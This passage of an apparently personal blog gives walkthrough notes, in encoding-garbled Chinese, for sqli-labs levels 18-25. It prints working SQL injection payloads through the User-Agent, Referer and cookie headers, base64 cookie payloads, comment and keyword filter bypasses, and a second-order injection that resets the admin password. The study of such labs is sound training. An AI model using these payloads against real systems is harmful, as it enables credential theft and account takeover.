<p>é—­åˆè¡¨è¾¾å¼ï¼šé€šè¿‡or â€˜â€™é—­åˆæ•´ä¸ªè¡¨è¾¾å¼ï¼Œç¡®ä¿è¯­æ³•æ­£ç¡®ã€‚  </p>
</blockquote>
<p><img src="http://39.105.15.250/aidemofashi_home/img/note-10/2.png" srcset="/img/loading.gif" lazyload alt="2">  </p>
<p>æœ€ç»ˆpayload</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">User</span>-Agent: &#x27; or extractvalue(<span class="hljs-number">1</span>,concat(&#x27;!&#x27;,(select concat(username,<span class="hljs-number">2</span>,password)from users limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>))),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)#<br><br><span class="hljs-attribute">User</span>-Agent: &#x27; or extractvalue(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x7e,database())),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)#<br></code></pre></td></tr></table></figure>
<p>ä¸ºä»€ä¹ˆè¦ç”¨ or æˆ– and è¿æ¥:</p>
<p>å› ä¸ºä½¿ç”¨äº†æŠ¥é”™æ³¨å…¥ï¼Œæ‰€ä»¥éœ€è¦ä½¿ç”¨oræˆ–andæ¥é—­åˆåŸè¯­å¥å¹¶æ’å…¥çš„æ³¨å…¥è¯­å¥ã€‚</p>
<h1 id="less19-å¤´éƒ¨æ³¨å…¥-Referer"><a href="#less19-å¤´éƒ¨æ³¨å…¥-Referer" class="headerlink" title="less19 å¤´éƒ¨æ³¨å…¥-Referer"></a>less19 å¤´éƒ¨æ³¨å…¥-Referer</h1><p>åç«¯å¯ä»¥æ³¨å…¥çš„è¯­å¥</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$insert</span>=<span class="hljs-string">&quot;INSERT INTO `security`.`referers` (`referer`, `ip_address`) VALUES (&#x27;<span class="hljs-subst">$uagent</span>&#x27;, &#x27;<span class="hljs-subst">$IP</span>&#x27;)&quot;</span>;<br></code></pre></td></tr></table></figure>
<p>ç›¸æ¯”ä¸Šä¸€å…³åªæœ‰ä¸¤ä¸ªå‚æ•°ï¼Œæ‰€ä»¥å¯ä»¥è¿™æ ·</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>&#x27; or updatexml(1,concat(&#x27;!&#x27;,(databass())),1),2)#  //çˆ†æ•°æ®åº“<br><br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>&#x27; or updatexml(1,concat(&#x27;!&#x27;,(select group_concat(table_name)from information_schema.tables where table_schema=&#x27;security&#x27;)),1),2)#  //çˆ†è¡¨å<br><br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>&#x27; or updatexml(1,concat(&#x27;!&#x27;,(select concat(column_name)from information_schema.columns where table_name=&#x27;users&#x27; and table_schema=&#x27;security&#x27; limit 0,1)),1),2)#   <br>//åˆ†æ®µå›æ˜¾<br><br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>&#x27; or updatexml(1,concat(&#x27;!&#x27;,(select concat(id,username,&#x27;!&#x27;,password)from users limit 0,1)),1),2)#<br>//æœ€åä¸€è¡Œè¡Œçˆ†<br></code></pre></td></tr></table></figure>

<p><img src="http://39.105.15.250/aidemofashi_home/img/note-10/3.png" srcset="/img/loading.gif" lazyload alt="3"><br>ä¹Ÿå¯ä»¥è¿™æ ·</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>&#x27; or extractvalue(1,concat(0x7e,database())) or&#x27;<br></code></pre></td></tr></table></figure>

<h1 id="less20"><a href="#less20" class="headerlink" title="less20"></a>less20</h1><p>é¢˜ç›®æç¤ºcookieæ³¨å…¥ï¼Œç™»å½•æ­£ç¡®çš„è´¦æˆ·åå‡ºç°ä»¥ä¸‹ç•Œé¢<br><img src="http://39.105.15.250/aidemofashi_home/img/note-10/4.png" srcset="/img/loading.gif" lazyload alt="4"><br>è¡¨å¤´å¦‚ä¸‹ï¼š</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/sqli-labs/Less-20/index.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>localhost<br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>max-age=0<br><span class="hljs-attribute">sec-ch-ua</span><span class="hljs-punctuation">: </span>&quot;Not(A:Brand&quot;;v=&quot;24&quot;, &quot;Chromium&quot;;v=&quot;122&quot;<br><span class="hljs-attribute">sec-ch-ua-mobile</span><span class="hljs-punctuation">: </span>?0<br><span class="hljs-attribute">sec-ch-ua-platform</span><span class="hljs-punctuation">: </span>&quot;Windows&quot;<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.112 Safari/537.36<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br><span class="hljs-attribute">Sec-Fetch-Site</span><span class="hljs-punctuation">: </span>same-origin<br><span class="hljs-attribute">Sec-Fetch-Mode</span><span class="hljs-punctuation">: </span>navigate<br><span class="hljs-attribute">Sec-Fetch-User</span><span class="hljs-punctuation">: </span>?1<br><span class="hljs-attribute">Sec-Fetch-Dest</span><span class="hljs-punctuation">: </span>document<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://localhost/sqli-labs/Less-20/<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>uname=admin<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br></code></pre></td></tr></table></figure>
<p>cookieåªæœ‰ä¸€ä¸ªunmaeï¼Ÿ<br>å°è¯•åœ¨unameæ³¨å…¥<br><img src="http://39.105.15.250/aidemofashi_home/img/note-10/5.png" srcset="/img/loading.gif" lazyload alt="5">  </p>
<p>å‘ç°æ³¨å…¥ç‚¹</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">Cookie: uname=&#x27;union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(id,username,<span class="hljs-string">&#x27;!&#x27;</span>,<span class="hljs-keyword">password</span>) <span class="hljs-keyword">from</span> users#<br></code></pre></td></tr></table></figure>

<p>å¯èƒ½æ˜¯è¯¥åç«¯ä»£ç é€ æˆäº†æ³¨å…¥</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">$sql=&quot;<span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> username=<span class="hljs-string">&#x27;$cookee&#x27;</span> <span class="hljs-keyword">LIMIT</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span><span class="hljs-string">&quot;;</span><br></code></pre></td></tr></table></figure>
<p><img src="http://39.105.15.250/aidemofashi_home/img/note-10/6.png" srcset="/img/loading.gif" lazyload alt="6">  </p>
<hr>
<h2 id="title-note-11date-2025-03-12-16-19-54tags-sql-labs"><a href="#title-note-11date-2025-03-12-16-19-54tags-sql-labs" class="headerlink" title="title: note-11date: 2025-03-12 16:19:54tags: sql-labs"></a>title: note-11<br>date: 2025-03-12 16:19:54<br>tags: sql-labs</h2><h1 id="less-21"><a href="#less-21" class="headerlink" title="less-21"></a>less-21</h1><p>æ ¹æ®é¢˜ç›®æç¤ºå…ˆç™»æ­£ç¡®è´¦æˆ·å¯†ç å—ï¼Œç„¶åbpæŠ“åŒ…</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/sqli-labs/Less-21/index.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>localhost<br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>max-age=0<br><span class="hljs-attribute">sec-ch-ua</span><span class="hljs-punctuation">: </span>&quot;Not(A:Brand&quot;;v=&quot;24&quot;, &quot;Chromium&quot;;v=&quot;122&quot;<br><span class="hljs-attribute">sec-ch-ua-mobile</span><span class="hljs-punctuation">: </span>?0<br><span class="hljs-attribute">sec-ch-ua-platform</span><span class="hljs-punctuation">: </span>&quot;Windows&quot;<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.112 Safari/537.36<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br><span class="hljs-attribute">Sec-Fetch-Site</span><span class="hljs-punctuation">: </span>same-origin<br><span class="hljs-attribute">Sec-Fetch-Mode</span><span class="hljs-punctuation">: </span>navigate<br><span class="hljs-attribute">Sec-Fetch-User</span><span class="hljs-punctuation">: </span>?1<br><span class="hljs-attribute">Sec-Fetch-Dest</span><span class="hljs-punctuation">: </span>document<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://localhost/sqli-labs/Less-21/index.php<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>uname=YWRtaW4%3D<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br></code></pre></td></tr></table></figure>
<p>çœ‹åˆ°cookieä¸­unameæ˜æ˜¾ä¸æ˜¯ç”¨æ¥ç™»å½•çš„admin,æ˜¯adminç»è¿‡base64åŠ å¯†åçš„å­—ç¬¦</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>uname=YWRtaW4%3D<br></code></pre></td></tr></table></figure>
<p>ç”¨èµ›åšå¨å­è§£å‡ºæ¥å°½ç„¶æ˜¯</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs http">YWRtaW4%3D<br>decode base64=<br>admin7<br></code></pre></td></tr></table></figure>
<p>æ€€ç–‘æ˜¯åé¢%3Dæ˜¯urlå­—ç¬¦ï¼Œ<br>å°†æ„å»ºå¥½çš„é—­åˆç‚¹åŠ å¯†æˆbase64åå†ä¸Šä¼ </p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs http">YWRtaW4n<br>å›æ˜¾<br>Issue with your mysql: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;&#x27;admin&#x27;&#x27;) LIMIT 0,1&#x27; at line 1<br></code></pre></td></tr></table></figure>
<p>æœ€åæµ‹å‡ºé—­åˆè¯­å¥</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs http">uname=YWRtaW4nKSM=<br>baseè§£ç å°±æ˜¯<br>uname=admin&#x27;)#<br></code></pre></td></tr></table></figure>
<p>æœ€åpayload</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>uname=JykgdW5pb24gc2VsZWN0IDEsMixncm91cF9jb25jYXQoaWQsdXNlcm5hbWUsJyEnLHBhc3N3b3JkKSBmcm9tIHVzZXJzIw==<br></code></pre></td></tr></table></figure>

<h1 id="less-22"><a href="#less-22" class="headerlink" title="less-22"></a>less-22</h1><p>å’Œä¸Šé¢˜è§£æ³•ä¸€æ ·ï¼Œå°±æ˜¯æ¢äº†é—­åˆç‚¹   </p>
<p>æœ€ç»ˆpayload</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>uname=IiB1bmlvbiBzZWxlY3QgMSwyLGdyb3VwX2NvbmNhdChpZCx1c2VybmFtZSwnIScscGFzc3dvcmQpIGZyb20gdXNlcnMj<br></code></pre></td></tr></table></figure>

<h1 id="less-23"><a href="#less-23" class="headerlink" title="less-23"></a>less-23</h1><p>çœ‹é¢˜ç›®ï¼Œ<br>strip comment,çœ‹ç¿»è¯‘æ˜¯åˆ é™¤æ³¨é‡Šï¼Œä¸æ‡‚å•¥æ„æ€<br>çœ‹ä¸€çœ¼ç½‘é¡µæºç ï¼Œ</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$</span><span class="language-bash">reg = <span class="hljs-string">&quot;/#/&quot;</span>;</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">reg1 = <span class="hljs-string">&quot;/--/&quot;</span>;</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">replace = <span class="hljs-string">&quot;&quot;</span>;</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash"><span class="hljs-built_in">id</span> = preg_replace(<span class="hljs-variable">$reg</span>, <span class="hljs-variable">$replace</span>, <span class="hljs-variable">$id</span>);</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash"><span class="hljs-built_in">id</span> = preg_replace(<span class="hljs-variable">$reg1</span>, <span class="hljs-variable">$replace</span>, <span class="hljs-variable">$id</span>);</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">sql=<span class="hljs-string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="hljs-variable">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br><br></code></pre></td></tr></table></figure>
<p>é—­åˆç‚¹æ˜¯â€™<br>ä½†å¥½åƒæŠŠ#,â€“,è¿™ç§æ³¨é‡Šç»™æ›¿æ¢æˆç©ºå­—ç¬¦äº†ï¼Œ<br>æœ‰æ²¡æœ‰ä¸ç”¨æ³¨é‡Šçš„æ–¹æ³•å‘¢ï¼Œ<br>æ³¨é‡Šçš„ä½œç”¨æ˜¯æŠŠåé¢çš„è¯­å¥æ— æ•ˆåŒ–ã€‚<br>é‚£è¯•è¯•ç»•è¿‡ï¼ŸåŒå†™ç»•è¿‡è¯•è¯•ï¼Ÿ<br>ä¸è¡Œï¼Œå®åœ¨è¯•ä¸å‡ºæ¥ï¼Œå»çœ‹åšå®¢å§  </p>
<h2 id="é‡‡ç”¨é—­åˆçš„æ–¹å¼ï¼š"><a href="#é‡‡ç”¨é—­åˆçš„æ–¹å¼ï¼š" class="headerlink" title="é‡‡ç”¨é—­åˆçš„æ–¹å¼ï¼š"></a>é‡‡ç”¨é—­åˆçš„æ–¹å¼ï¼š</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?id=<span class="hljs-string">&#x27; or extractvalue(1,concat(0x7e,database())) or&#x27;</span> <br></code></pre></td></tr></table></figure>
<p>å¥½åƒæ˜¯æ‹¼å…¥æºç ä¼šå˜æˆ</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;SELECT * FROM users WHERE id=&#x27;&#x27; or extractvalue(1,concat(0x7e,database())) or&#x27;&#x27; LIMIT 0,1&quot;</span>;<br></code></pre></td></tr></table></figure>
<p>å¯¹æ¯”</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;SELECT * FROM users WHERE id=&#x27;&#x27;union select #&#x27; LIMIT 0,1&quot;</span>;<br><span class="hljs-comment">//è‹¥æ­¤å‡ºæ³¨é‡Šç¬¦è¢«è¿‡æ»¤,åˆ™ä¼šå¤šå‡ºä¸€ä¸ªå•å¼•å·å¯¼è‡´æ— æ³•æ³¨å…¥</span><br><span class="hljs-comment">//è¢«è¿‡æ»¤åçš„ç»“æœ</span><br><span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;SELECT * FROM users WHERE id=&#x27;&#x27;union select&#x27; LIMIT 0,1&quot;</span>;<br></code></pre></td></tr></table></figure>

<h2 id="é‡‡ç”¨-00æ›¿æ¢æ³¨é‡Š"><a href="#é‡‡ç”¨-00æ›¿æ¢æ³¨é‡Š" class="headerlink" title="é‡‡ç”¨;%00æ›¿æ¢æ³¨é‡Š"></a>é‡‡ç”¨;%00æ›¿æ¢æ³¨é‡Š</h2><p>é‡‡ç”¨;%00æ›¿æ¢æ³¨é‡Šï¼š</p>
<figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs matlab">?id=<span class="hljs-number">1</span>&#x27;;<span class="hljs-comment">%00</span><br></code></pre></td></tr></table></figure>

<blockquote>
<p>%00 æ˜¯ URL ç¼–ç çš„ç©ºå­—ç¬¦ï¼ˆ\x00ï¼‰  </p>
</blockquote>
<p>ç»„åˆ ;%00 çš„å®Œæ•´é€»è¾‘<br>æ”»å‡»è€…é€šè¿‡ ;%00 å®ç°ä»¥ä¸‹ç›®æ ‡ï¼š</p>
<blockquote>
<p>ç»“æŸå½“å‰è¯­å¥ï¼šåˆ†å· ; ç»ˆæ­¢ UNION SELECT æŸ¥è¯¢ã€‚</p>
</blockquote>
<blockquote>
<p>æˆªæ–­åç»­å†…å®¹ï¼šç©ºå­—ç¬¦ %00 è®©åç«¯å¿½ç•¥åŸæŸ¥è¯¢ä¸­å¯èƒ½å­˜åœ¨çš„å…¶ä»–æ¡ä»¶ï¼ˆå¦‚ LIMIT 1 æˆ– AND å­å¥ï¼‰ã€‚</p>
</blockquote>
<blockquote>
<p>ç»•è¿‡é—­åˆå¼•å·ï¼šå¦‚æœåŸæŸ¥è¯¢çš„é—­åˆå¼•å·åœ¨ç©ºå­—ç¬¦åè¢«æˆªæ–­ï¼Œå¯èƒ½é¿å…è¯­æ³•é”™è¯¯ã€‚</p>
</blockquote>
<p>æœ€åpayloadï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?id=<span class="hljs-string">&#x27; union select 1,2,group_concat(username,&#x27;</span>:<span class="hljs-string">&#x27;,password) from users;%00</span><br></code></pre></td></tr></table></figure>

<h1 id="less-24-äºŒæ¬¡æ³¨å…¥"><a href="#less-24-äºŒæ¬¡æ³¨å…¥" class="headerlink" title="less 24 äºŒæ¬¡æ³¨å…¥"></a>less 24 äºŒæ¬¡æ³¨å…¥</h1><blockquote>
<p>äºŒæ¬¡æ³¨å…¥<br>äºŒæ¬¡æ³¨å…¥æ˜¯å­˜å‚¨å‹æ³¨å…¥ï¼Œå¯ä»¥ç†è§£ä¸ºæ„é€ æ¶æ„æ•°æ®å­˜å‚¨åœ¨æ•°æ®åº“åï¼Œæ¶æ„æ•°æ®è¢«è¯»å–å¹¶è¿›å…¥åˆ°äº†SQLæŸ¥è¯¢è¯­å¥æ‰€å¯¼è‡´çš„æ³¨å…¥ã€‚</p>
</blockquote>
<h2 id="çœ‹åˆ«çš„å¤§ä½¬åšå®¢"><a href="#çœ‹åˆ«çš„å¤§ä½¬åšå®¢" class="headerlink" title="çœ‹åˆ«çš„å¤§ä½¬åšå®¢"></a>çœ‹åˆ«çš„å¤§ä½¬åšå®¢</h2><p>åœ¨æ³¨å†Œæ–°ç”¨æˆ·ä¸­æ³¨å†Œå·²æœ‰çš„ç”¨æˆ·åä¼šæç¤ºä¸è¡Œï¼Œä½†æ˜¯usernameæ²¡æœ‰è¢«è¿‡æ»¤ï¼Œå¯ä»usernameä¸‹æ‰‹ã€‚   </p>
<p>æˆ‘ä»¬å…ˆæ³¨å†Œä¸€ä¸ªè´¦å·åå«adminâ€™#ã€‚å¯ä»¥çœ‹åˆ°æˆ‘ä»¬æˆåŠŸå°†æœ‰æ±¡æŸ“çš„æ•°æ®å†™å…¥æ•°æ®åº“ã€‚å•å¼•å·æ˜¯ä¸ºäº†å’Œä¹‹åå¯†ç ä¿®çš„ç”¨æˆ·åçš„å•å¼•å·è¿›è¡Œé—­åˆï¼Œ#æ˜¯ä¸ºäº†æ³¨é‡Šåé¢çš„æ•°æ®ã€‚</p>
<p>ä¹‹åä¹Ÿç”¨æˆ·åadminâ€™#å’Œå¯†ç æ˜¯123456ç™»å½•ï¼Œè¿›å…¥ä¿®æ”¹å¯†ç é¡µé¢ã€‚åŸå§‹å¯†ç è¾“å…¥123456ï¼Œæ–°å¯†ç æˆ‘è¾“å…¥çš„æ˜¯111111ï¼Œå¯ä»¥çœ‹åˆ°å¯†ç ä¿®æ”¹æˆåŠŸã€‚  </p>
<p>å½“æˆ‘ä»¬æ•°æ®åº“æŸ¥çœ‹çš„æ—¶å€™å‘ç°ä¿®æ”¹çš„æ˜¯ç®¡ç†å‘˜çš„å¯†ç ã€‚è€Œä¸æ˜¯æˆ‘ä»¬çš„æ³¨å†Œè´¦æˆ·çš„å¯†ç ã€‚  </p>
<blockquote>
<p>æˆ‘çš„æ€»ç»“ç†è§£æ˜¯åœ¨æ³¨å†Œæ–°ç”¨æˆ·æ—¶æŠŠæœ‰æ±¡æŸ“çš„æ•°æ®å†™å…¥æ•°æ®åº“ï¼Œå½“å†ä¿®æ”¹adminâ€™#æ—¶ä¼šç›´æ¥æŠŠadminâ€™#æ‹¼å…¥ä¿®æ”¹çš„æŸ¥è¯¢è¯­å¥ï¼Œè€Œæ³¨é‡Šæ‰äº†åŸæ¥éªŒè¯åŸè´¦å·å¯†ç çš„éƒ¨åˆ†</p>
</blockquote>
<p>åŸè¯­å¥ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;UPDATE users SET PASSWORD=&#x27;<span class="hljs-subst">$pass</span>&#x27; where username=&#x27;<span class="hljs-subst">$username</span>&#x27; and password=&#x27;<span class="hljs-subst">$curr_pass</span>&#x27; &quot;</span><br></code></pre></td></tr></table></figure>
<p>å½“ç™»å½•adminâ€™#å¹¶ç‚¹ä¿®æ”¹å¯†ç æ—¶ä¼šå‡ºç°</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;UPDATE users SET PASSWORD=&#x27;1234&#x27; where username=&#x27;admin&#x27;#&#x27; and password=&#x27;<span class="hljs-subst">$curr_pass</span>&#x27; &quot;</span><br></code></pre></td></tr></table></figure>
<p>è¿™æ ·å°±ä¼šå˜æˆä¿®æ”¹adminçš„å¯†ç è€Œä¸æ˜¯adminâ€™#çš„ï¼Œå¹¶ä¸”ä¼šå°†åé¢éªŒè¯adminå¯†ç çš„éƒ¨åˆ†æ³¨é‡Šæ‰ã€‚</p>
<hr>
<h2 id="title-note-12date-2025-03-13-18-58-13tags-sql-labs"><a href="#title-note-12date-2025-03-13-18-58-13tags-sql-labs" class="headerlink" title="title: note-12date: 2025-03-13 18:58:13tags: sql-labs"></a>title: note-12<br>date: 2025-03-13 18:58:13<br>tags: sql-labs</h2><h1 id="less-25-å­—ç¬¦è¿‡æ»¤ç»•è¿‡"><a href="#less-25-å­—ç¬¦è¿‡æ»¤ç»•è¿‡" class="headerlink" title="less-25 å­—ç¬¦è¿‡æ»¤ç»•è¿‡"></a>less-25 å­—ç¬¦è¿‡æ»¤ç»•è¿‡</h1><p>ç”±é¢˜ç›®å¯çŸ¥é“è¿‡æ»¤äº†orå’Œandï¼Œå¤§å°å†™æ²¡ç”¨ã€‚</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">blacklist</span>(<span class="hljs-params"><span class="hljs-variable">$id</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>	<span class="hljs-variable">$id</span>= <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/or/i&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);			<span class="hljs-comment">//strip out OR (non case sensitive)</span><br>	<span class="hljs-variable">$id</span>= <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/AND/i&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);		<span class="hljs-comment">//Strip out AND (non case sensitive)</span><br>	<span class="hljs-keyword">return</span> <span class="hljs-variable">$id</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>iè¡¨ç¤ºä¸æ•æ„Ÿå¤§å°å†™ï¼Œè¿™æ ·çš„è¯æƒ³ç”¨æŠ¥é”™æ³¨å…¥å°±è¦è¿›è¡Œç»•è¿‡äº†  </p>
<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs 1c">andå¯ä»¥ç”¨<span class="hljs-meta">&amp;&amp;</span><br>orå¯ä»¥ç”¨<span class="hljs-string">||</span><br></code></pre></td></tr></table></figure>

<p>ä¹Ÿæœ‰åŒå†™ç»•è¿‡</p>
<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">è¾“å…¥<br>oorr<br>è¿›è¡Œè¿‡æ»¤åä¼šå˜æˆ<br><span class="hljs-keyword">or</span><br><span class="hljs-keyword"></span>å®ç°ç»•è¿‡<br><br>åŒç†<br>è¾“å…¥aandnd<br>ç»è¿‡è¿‡æ»¤å˜æˆ<br><span class="hljs-keyword">and</span><br></code></pre></td></tr></table></figure>

<p>å½“ç„¶å¯ä»¥ç›´æ¥ç”¨è”åˆæ³¨å…¥æ³•ï¼š<br>æ³¨æ„è¦ç»•è¿‡å­—ç¬¦</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs payload">?id=&#x27; union select 1,2,group_concat(table_name) from infoorrmation_schema.tables where table_schema=&#x27;security&#x27; --+<br><br>?id=&#x27; union select 1,2,group_concat(column_name) from infoorrmation_schema.columns where table_name=&#x27;users&#x27; aandnd table_schema=&#x27;security&#x27;--+<br><br>informationè¦æ¢æˆinfoorrmationã€‚<br>andè¦æ¢æˆ&amp;&amp;æˆ–è€…aandndã€‚<br></code></pre></td></tr></table></figure>
